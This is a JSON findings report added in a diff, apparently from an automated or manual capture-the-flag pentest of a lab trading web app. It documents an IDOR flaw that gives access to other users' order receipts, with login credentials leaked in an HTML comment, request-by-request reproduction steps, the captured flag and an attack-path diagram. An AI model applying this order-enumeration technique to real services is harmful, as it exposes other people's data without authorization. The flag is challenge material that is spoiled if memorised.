@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T20:21:43.390617+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "c095b912-f84b-4675-a7fe-878ac505ff22",
+      "timestamp": "2026-04-12T20:21:43.390529+00:00",
+      "title": "BOLA/IDOR: Archive Another User's Order to Access Receipt Containing Flag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:33335/order/300198/archive",
+      "description": "The Trading Platform suffers from a Broken Object Level Authorization (BOLA/IDOR) vulnerability across two endpoints: /order/<id>/archive and /order/<id>/receipt.\n\nThe application grants read access to an order's receipt if the authenticated user is either the creator OR the archiver of the order. By accessing /order/<id>/archive on an order belonging to another user, an attacker becomes that order's 'archiver' and subsequently gains unauthorized access to the receipt.\n\nAttack chain:\n1. Login as test:test (credentials leaked in HTML comment)\n2. Enumerate order IDs near own orders (300123, 300214, 300327, 300481)\n3. Access GET /order/300198/archive - another user's order is archived under attacker's account\n4. Access GET /order/300198/receipt - now accessible because attacker is the 'archiver'\n5. Receipt contains the CTF flag.",
+      "evidence": "FLAG: flag{8b9df79e-91eb-4f4e-8449-5e1d207a0d83}\n\nReceipt response for /order/300198/receipt after archiving:\n<code class=\"text-white\">flag{8b9df79e-91eb-4f4e-8449-5e1d207a0d83}</code>\n\nOrder 300198 (belonging to another user) was successfully archived via GET /order/300198/archive returning HTTP 200 with Orders page. Subsequently, /order/300198/receipt returned the receipt with the flag.",
+      "tool_used": "manual HTTP",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "1. POST / with username=test\n2. Follow redirect to /password/test\n3. POST /password/test with username=test&user_id=10032&password=test\n4. GET /order/300198/archive (with session cookie) -> archives another user's order\n5. GET /order/300198/receipt (with session cookie) -> returns receipt with flag",
+        "expected": "flag{8b9df79e-91eb-4f4e-8449-5e1d207a0d83}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "d195474d-66ea-46e1-bba6-a2355144280a",
+      "timestamp": "2026-04-12T20:21:56.566436+00:00",
+      "title": "Trading Platform - Attack Surface & Exploit Path",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Login[\"GET / POST / - Login (username only)\"]\n  Login --> PasswordPage[\"GET /password/test - Step 2 login\"]\n  PasswordPage --> Auth[\"POST /password/test - Authenticate\"]\n  Auth --> Session[\"Flask Session Cookie {user_id: 10032}\"]\n  Session --> Dashboard[\"GET /dashboard?username=test\"]\n  Dashboard --> Orders[\"GET /orders - List active orders\"]\n  Dashboard --> Archive[\"GET /orders_archive - Archived orders\"]\n  Orders --> ReceiptAPI[\"GET /order/ID/receipt - View receipt\"]\n  Orders --> ArchiveAPI[\"GET /order/ID/archive - Archive order\"]\n  ArchiveAPI -->|\"IDOR: archive any order ID\"| OtherOrder[\"Order 300198 - Other User\"]\n  OtherOrder -->|\"Attacker becomes archiver\"| ReceiptAPI\n  ReceiptAPI -->|\"Now accessible\"| Flag[\"flag{8b9df79e-91eb-4f4e-8449-5e1d207a0d83}\"]\n  HTMLComment[\"HTML Comment: test:test creds\"] --> Login\n  style Flag fill:#ff0000,color:#ffffff\n  style OtherOrder fill:#ff6600,color:#ffffff\n  style HTMLComment fill:#ffaa00,color:#000000"
+    }
+  ]
+}
